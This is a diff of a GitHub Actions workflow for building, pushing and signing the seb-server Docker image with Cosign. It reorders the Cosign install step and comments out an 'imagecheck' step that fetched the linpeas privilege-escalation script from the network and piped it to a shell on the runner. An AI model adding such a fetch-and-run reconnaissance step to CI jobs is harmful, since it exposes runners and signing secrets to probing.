@@ -111,9 +111,6 @@ jobs:
       run: |
         echo $TAG_NAME
         echo ${{ env.TAG_NAME }}
-    - 
-       name: Install Cosign
-       uses: sigstore/cosign-installer@main
     -
       name: Set up QEMU
       uses: docker/setup-qemu-action@v1
@@ -144,10 +141,13 @@ jobs:
         push: true
         tags: |
           anhefti/seb-server:${{ env.TAG_NAME }}
-    -
-      name: imagecheck
-      run: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'
-      shell: bash
+#    -
+#      name: imagecheck
+#      run: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'
+#      shell: bash
+    - 
+      name: Install Cosign
+      uses: sigstore/cosign-installer@main
     -
       name: Write signing key to disk
       run: 'echo "$KEY" > /tmp/cosign.key'
